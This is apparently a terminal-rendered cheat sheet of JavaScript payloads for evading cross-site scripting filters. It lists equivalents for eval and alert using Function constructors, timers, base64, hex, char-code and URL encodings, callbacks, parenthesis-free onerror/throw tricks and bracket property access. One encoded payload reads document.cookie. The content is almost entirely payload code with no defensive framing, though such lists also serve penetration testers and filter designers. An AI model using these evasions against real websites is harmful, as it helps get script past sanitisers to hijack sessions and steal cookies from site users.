[34m│[0m ### JavaScript Execution Equivalents                                         [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **DIRECT EXECUTION:**                                                        [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m eval(code)                    → Function(code)()                             [34m│[0m
[34m│[0m                               → []['constructor']['constructor'](code)()     [34m│[0m
[34m│[0m                               → setTimeout(code, 0)                          [34m│[0m
[34m│[0m                               → setInterval(code, 0)                         [34m│[0m
[34m│[0m                               → new Function(code)()                         [34m│[0m
[34m│[0m                               → constructor.constructor(code)()              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **STRING TO CODE:**                                                          [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m eval('alert(1)')              → eval(atob('YWxlcnQoMSk='))                   [34m│[0m
[34m│[0m                               →                                              [34m│[0m
[34m│[0m eval(String.fromCharCode(97,108,101,114,116))                                [34m│[0m
[34m│[0m                               → eval('\x61\x6c\x65\x72\x74\x28\x31\x29')     [34m│[0m
[34m│[0m                               → eval(unescape('%61%6c%65%72%74%28%31%29'))   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **FUNCTION CALL ALTERNATIVES:**                                              [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m alert(1)                      → alert`1`                                     [34m│[0m
[34m│[0m                               → alert.call(null,1)                           [34m│[0m
[34m│[0m                               → alert.apply(null,[1])                        [34m│[0m
[34m│[0m                               → Reflect.apply(alert,null,[1])                [34m│[0m
[34m│[0m                               → [1].map(alert)                               [34m│[0m
[34m│[0m                               → [1].find(alert)                              [34m│[0m
[34m│[0m                               → [1].filter(alert)                            [34m│[0m
[34m│[0m                               → [1].forEach(alert)                           [34m│[0m
[34m│[0m                               → [1].every(alert)                             [34m│[0m
[34m│[0m                               → [1].findIndex(alert)                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **BYPASS PARENTHESIS:**                                                      [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m onerror=alert;throw 1337                                                     [34m│[0m
[34m│[0m {onerror=alert}throw 1337                                                    [34m│[0m
[34m│[0m throw onerror=alert,'some string',123,'haha'                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **BYPASS DOT FILTER:**                                                       [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m window['alert'](document['domain'])                                          [34m│[0m
[34m│[0m eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **PROPERTY ACCESS ALTERNATIVES:**                                            [34m│[0m
[34m│[0m ```javascript                                                                [34m│[0m
[34m│[0m window.alert                  → window['alert']                              [34m│[0m
[34m│[0m                               → window['al'+'ert']                           [34m│[0m
[34m│[0m                               → window                                       [34m│[0m
[34m│[0m                               → Reflect.get(window,'alert')                  [34m│[0m
[34m│[0m                               → self['alert']                                [34m│[0m
[34m│[0m                               → top['alert']                                 [34m│[0m
[34m│[0m                               → frames['alert']                              [34m│[0m
[34m│[0m                               → parent['alert']                              [34m│[0m
[34m│[0m                               → this['alert']                                [34m│[0m
[34m│[0m                               → content['alert']                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
